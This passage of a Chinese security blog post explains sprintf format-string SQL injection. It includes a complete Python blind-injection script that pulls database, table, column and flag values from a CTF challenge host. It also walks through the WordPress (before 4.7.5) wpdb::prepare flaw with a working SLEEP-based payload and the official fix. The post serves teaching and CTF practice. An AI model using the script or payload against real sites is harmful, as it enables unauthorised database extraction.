class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def boom():</span><br><span class="line">    url = r&apos;http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/&apos;</span><br><span class="line">    s = requests.session()</span><br><span class="line">	//会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。</span><br><span class="line">    dic = string.digits + string.letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-=&quot;</span><br><span class="line">    right = &apos;password error!&apos;</span><br><span class="line">    error = &apos;username error!&apos;</span><br><span class="line">    lens = 0</span><br><span class="line">    i = 0</span><br><span class="line">	//确定当前数据库的长度</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;admin%1$\\&apos; or &quot; + &quot;length(database())&gt;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">        data=&#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        if error in r:</span><br><span class="line">            lens=i</span><br><span class="line">            break</span><br><span class="line">        i+=1</span><br><span class="line">        pass</span><br><span class="line">    print(&quot;[+]length(database()): %d&quot; %(lens))</span><br><span class="line">	//确定当前数据库的名字</span><br><span class="line">    strs=&apos;&apos;</span><br><span class="line">    for i in range(lens+1):</span><br><span class="line">        for c in dic:</span><br><span class="line">            payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr(database(),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot;</span><br><span class="line">            data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            if right in r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                print strs</span><br><span class="line">                break</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line">    print(&quot;[+]database():%s&quot; %(strs))</span><br><span class="line"></span><br><span class="line">    lens=0</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">		//对当前的数据库，查询第一个表的长度</span><br><span class="line">        data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        if error in r:</span><br><span class="line">            lens = i</span><br><span class="line">            break</span><br><span class="line">        i+=1</span><br><span class="line">        pass</span><br><span class="line">    print(&quot;[+]length(table): %d&quot; %(lens))</span><br><span class="line"></span><br><span class="line">    strs=&apos;&apos;</span><br><span class="line">    for i in range(lens+1):</span><br><span class="line">        for c in dic:</span><br><span class="line">            payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot;</span><br><span class="line">			// 数字一定要str才可以传入</span><br><span class="line">            data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            if right in r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                print strs</span><br><span class="line">                break</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line">    print(&quot;[+]table_name:%s&quot; %(strs))</span><br><span class="line">    tablename = &apos;0x&apos; + strs.encode(&apos;hex&apos;)</span><br><span class="line">	//编码为16进制</span><br><span class="line">    table_name = strs</span><br><span class="line"></span><br><span class="line">    lens=0</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(column_name) from information_schema.columns where table_name = &quot; + str(tablename) + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">        data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        if error in r:</span><br><span class="line">            lens = i</span><br><span class="line">            break</span><br><span class="line">        i+=1</span><br><span class="line">        pass</span><br><span class="line">    print(&quot;[+]length(column): %d&quot; %(lens))</span><br><span class="line"></span><br><span class="line">    strs=&apos;&apos;</span><br><span class="line">    for i in range(lens+1):</span><br><span class="line">        for c in dic:</span><br><span class="line">            payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select column_name from information_schema.columns where table_name = &quot; + str(tablename) +&quot; limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot;</span><br><span class="line">            data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            if right in r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                print strs</span><br><span class="line">                break</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line">    print(&quot;[+]column_name:%s&quot; %(strs))</span><br><span class="line">    column_name = strs</span><br><span class="line">	</span><br><span class="line">    num=0</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select count(*) from &quot; + table_name + &quot;)&gt;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">        data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        if error in r:</span><br><span class="line">            num = i</span><br><span class="line">            break</span><br><span class="line">        i+=1</span><br><span class="line">        pass</span><br><span class="line">    print(&quot;[+]number(column): %d&quot; %(num))</span><br><span class="line"></span><br><span class="line">    lens=0</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(&quot; + column_name + &quot;) from &quot; + table_name + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">        data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        if error in r:</span><br><span class="line">            lens = i</span><br><span class="line">            break</span><br><span class="line">        i+=1</span><br><span class="line">        pass</span><br><span class="line">    print(&quot;[+]length(value): %d&quot; %(lens))</span><br><span class="line"></span><br><span class="line">    i=1    </span><br><span class="line">    strs=&apos;&apos;</span><br><span class="line">    for i in range(lens+1):</span><br><span class="line">        for c in dic:</span><br><span class="line">            payload = &quot;admin%1$\\&apos; or ascii(substr((select flag from flag limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot;</span><br><span class="line">            data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;1&apos;&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            if right in r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                print strs</span><br><span class="line">                break</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line">    print(&quot;[+]flag:%s&quot; %(strs))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    boom()</span><br><span class="line">    print &apos;Finish!&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = addslashes(&quot;%1$&apos; and 1=1#&quot;);</span><br><span class="line">echo $input;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$b = sprintf(&quot;AND b=&apos;%s&apos;&quot;,$input);</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$sql = sprintf(&quot;select * from t where a=&apos;%s&apos; $b&quot;,&apos;admin&apos;);</span><br><span class="line">echo $sql;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;结果</span><br><span class="line">%1$\&apos; and 1=1#</span><br><span class="line">AND b=&apos;%1$\&apos; and 1=1#&apos;</span><br><span class="line">select * from t where a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>格式字符%后面会吃掉一个\即%1$\被替换为空，逃逸出来一个单引号，造成注入.</p>
+</blockquote>
+<h2 id="0x04-Wordpress格式化字符串漏洞"><a href="#0x04-Wordpress格式化字符串漏洞" class="headerlink" title="0x04 Wordpress格式化字符串漏洞"></a>0x04 Wordpress格式化字符串漏洞</h2><h3 id="漏洞跟踪"><a href="#漏洞跟踪" class="headerlink" title="漏洞跟踪"></a>漏洞跟踪</h3><blockquote>
+<p>wordpress版本小于4.7.5在后台图片删除的地方存在一处格式化字符串漏洞<br>官方在4.7.6已经给出了补救办法<br>在我们即将要说的地方增加了这么一端代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位</p>
+</blockquote>
+<blockquote>
+<p>首先<br>我们找到upload.php<br>可以发现在deleta中 $post_id_del（比如int()） 未经过处理，直接传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">case &apos;delete&apos;:</span><br><span class="line">    if ( !isset( $post_ids ) )</span><br><span class="line">        break;</span><br><span class="line">    foreach ( (array) $post_ids as $post_id_del ) &#123;</span><br><span class="line">        if ( !current_user_can( &apos;delete_post&apos;, $post_id_del ) ) //跟进</span><br><span class="line">            wp_die( __( &apos;Sorry, you are not allowed to delete this item.&apos; ) );</span><br><span class="line"></span><br><span class="line">        if ( !wp_delete_attachment( $post_id_del ) )</span><br><span class="line">            wp_die( __( &apos;Error in deleting.&apos; ) );</span><br><span class="line">    &#125;</span><br><span class="line">    $location = add_query_arg( &apos;deleted&apos;, count( $post_ids ), $location );</span><br><span class="line">    break;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>跟进wp_delete_attachment( )函数<br>其中参数$post_id_del为图片的postid<br>wp_delete_attachment( )中 调用了delete_metadata 函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function wp_delete_attachment( $post_id, $force_delete = false ) &#123;</span><br><span class="line">.......</span><br><span class="line">delete_metadata( &apos;post&apos;, null, &apos;_thumbnail_id&apos;, $post_id, true ); // delete all for any posts.</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>继续跟进delete_metadata函数<br>漏洞触发点主要在wp-includes/meta.php 的 delete_metadata函数里面， 有如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ( $delete_all ) &#123;</span><br><span class="line">    $value_clause = &apos;&apos;;</span><br><span class="line">    if ( &apos;&apos; !== $meta_value &amp;&amp; null !== $meta_value &amp;&amp; false !== $meta_value ) &#123;</span><br><span class="line">        $value_clause = $wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $object_ids = $wpdb-&gt;get_col( $wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>调用了两个prepare函数<br>跟进prepare函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public function prepare( $query, $args ) &#123;</span><br><span class="line">	if ( is_null( $query ) )</span><br><span class="line">        return;</span><br><span class="line">    // This is not meant to be foolproof -- but it will catch obviously incorrect usage.</span><br><span class="line">    if ( strpos( $query, &apos;%&apos; ) === false ) &#123;</span><br><span class="line">        _doing_it_wrong( &apos;wpdb::prepare&apos;, sprintf( __( &apos;The query argument of %s must have a placeholder.&apos; ), &apos;wpdb::prepare()&apos; ), &apos;3.9.0&apos; );</span><br><span class="line">&#125;</span><br><span class="line">    $args = func_get_args();</span><br><span class="line">    array_shift( $args );</span><br><span class="line">    // If args were passed as an array (as in vsprintf), move them up</span><br><span class="line">    if ( isset( $args[0] ) &amp;&amp; is_array($args[0]) )</span><br><span class="line">        $args = $args[0];</span><br><span class="line">    $query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it</span><br><span class="line">    $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting</span><br><span class="line">    $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware</span><br><span class="line">    $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s</span><br><span class="line">    array_walk( $args, array( $this, &apos;escape_by_ref&apos; ) );</span><br><span class="line">    return @vsprintf( $query, $args );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>详细看prepare函数对传入参数的处理过程<br>首先对%s进行处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it</span><br><span class="line">    $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting</span><br><span class="line">    $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware</span><br><span class="line">    $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>把’%s’替换为%s，然后再把”%s”替换成%s，替换为浮点数%F 把%s替换成’%s’<br>最后再进行vsprintf( $query, $args );<br>对拼接的语句进行格式化处理</p>
+</blockquote>
+<blockquote>
+<p>我们一步步分析<br>假设传入的$meta_value为’admin’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value );</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>经过prepare函数处理后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vsprintf( &quot; AND meta_value = &apos;%s&apos;&quot;,&apos;admin&apos;)</span><br><span class="line">=&gt;  AND meta_value = &apos;admin&apos;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>return到上一级函数后，继续执行这一条拼接语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key )</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>经过prepare函数处理后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vsprintf( &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos;  AND meta_value = &apos;admin&apos;&quot;,&apos;admin&apos;)</span><br><span class="line">=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos;  AND meta_value = &apos;admin&apos;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>看起来一切都很正常，毫无bug<br>但是我们可以思考一下，怎样使其形成注入呢？s&gt; 或者说怎样逃逸一个单引号？<br>在之前我们先看一下，可控变量 $post_id_del 的路线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$post_id_del =&gt; $post_id =&gt; $meta_value =&gt; $args =&gt; $query</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>显然这里面两处admin都有单引号，而且两处都与 $post_id_del 联系，如何来选择？</p>
+</blockquote>
+<blockquote>
+<p>对于第一处单引号<br>它是通过一次替换处理得到的，显然是对单引号&gt;无法处理<br>对于第二处单引号<br>经过两次的替换，（这里的意思是执行了两次的替换代码，可能第二段代码对他没有起到实质性的作用，仅仅是去点单引号然后又加上单引号）<br>但是这一出经过了两次处理是必须的，那么我们是否能够是构造出另一个单引号（此时第二处有三个单引号）就可以闭合前面的单引号了</p>
+</blockquote>
+<blockquote>
+<p>最重要的是，第二次的替换处理的变量是可控的，因此要引入单引号，我们需要$meta_value含有%s<br>那么第一次的结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AND meta_value = &apos;X%sY&apos;（其中XY为未知量）</span><br><span class="line">//这里需要注意，为什么%s不被单引号围起来，我看过一篇博客，它是写的&apos;%s&apos;，这显然是错的，为什么呢？我们生成了&apos;%s&apos;是没错，不过还原一下过程就知道了，首先我们生成了AND meta_value = &apos;%s&apos;，注意此时与$meta_value没有半毛钱关系，后来的vsprintf后，才与$meta_value有了关系，原来的%s被替换成了X%sY，值得注意的是这里的%s没有经过任何处理，处理是在第二轮进行的，这是后话。</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>第二次后的结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos;  AND meta_value = &apos;X&apos;%s&apos;Y&apos;</span><br><span class="line">（对于第二处的%s我们先不要带入格式化后的值，其实真实的语句应该为：</span><br><span class="line">SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos;  AND meta_value = &apos;X&apos;admin&apos;Y&apos;）</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>分析到这里，相信大家应该知道传值（$meta_value）使单引号逃逸出来了吧</p>
+</blockquote>
+<blockquote>
+<p>admin显然是多余的，那么我们需要把它放在单引号里面，因此第二个单引号需要去掉，那么第四个单引号需要注释掉，这就很轻而易举地构造sql语句<br>AND meta_value = ‘Xadmin’Y<br>Y里面就是我们注入的代码</p>
+</blockquote>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
+<p>怎么去传值呢？<br>利用格式化字符串漏洞</p>
+</blockquote>
+<blockquote>
+<p>去掉第二个单引号就需要使该单引号成为%后的第一个字符，也就是%’，但是我们还需要一个占位符，%1$’ 这样就没有报错的去掉了该单引号</p>
+</blockquote>
+<blockquote>
+<p>所以我们构造的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$meta_value = %1$%s AND SLEEP(5)#</span><br><span class="line">=&gt; AND meta_value = &apos;%1$%s AND SLEEP(5)&apos;</span><br><span class="line">=&gt; &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos; AND meta_value = AND meta_value = &apos;%1$&apos;%s&apos; AND SLEEP(5)#&apos;&quot;,&apos;admin&apos;</span><br><span class="line">其中 %1$&apos; =&gt; 空</span><br><span class="line">=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos;  AND meta_value = AND meta_value = &apos;admin&apos; AND SLEEP(5)#&apos;</span><br><span class="line">成功利用该漏洞形成时间注入</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h3><blockquote>
+<p>现在我们说一下第四部分开头的补救方法<br>后来官方在prepare函数加了这一代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位</p>
+</blockquote>
+
+      
+    </div>
+	<div>
+      
+          <div>
+     
+        <div style="text-align:center;color: #ccc;font-size:15px;">
+              -------------本文结束&感谢您的阅读-------------
+        </div>
+</div>
+      
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    KKABqN
+  </li>
+    <li class="post-copyright-author">
+    <strong>Post title:</strong>
+    <a href="/2018/11/05/1/">深入解析sprintf格式化字符串漏洞</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>Publishing time:</strong>
+    2018年11月05日 - 20:11
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://1234xxh.github.io/2018/11/05/1/" title="深入解析sprintf格式化字符串漏洞">http://1234xxh.github.io/2018/11/05/1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+  <li>转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/格式化字符串漏洞/" rel="tag"># 格式化字符串漏洞</a>
+          
+            <a href="/tags/Wordpress/" rel="tag"># Wordpress</a>
+          
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/02/1/" rel="next" title="moctf-web探索">
+                <i class="fa fa-chevron-left"></i> moctf-web探索
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODU3Ni8xNTEwNA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/background.jpg"
+                alt="KKABqN" />
+            
+              <p class="site-author-name" itemprop="name">KKABqN</p>
+              <p class="site-description motion-element" itemprop="description">我的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/1234xxh/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:kenvinxxh@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.zhihu.com/people/your-user-name" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.youtube.com/channel/UC796ubsIpUxtC6JjUD_GuRA" target="_blank" title="YouTube">
+                      
+                        <i class="fa fa-fw fa-youtube"></i>YouTube</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pawelli.com/" title="Pawel Li" target="_blank">Pawel Li</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.cnblogs.com/miraitowa" title="落花四月" target="_blank">落花四月</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/Triomphe/" title="木剑配酒" target="_blank">木剑配酒</a>
+                  </li>
+                
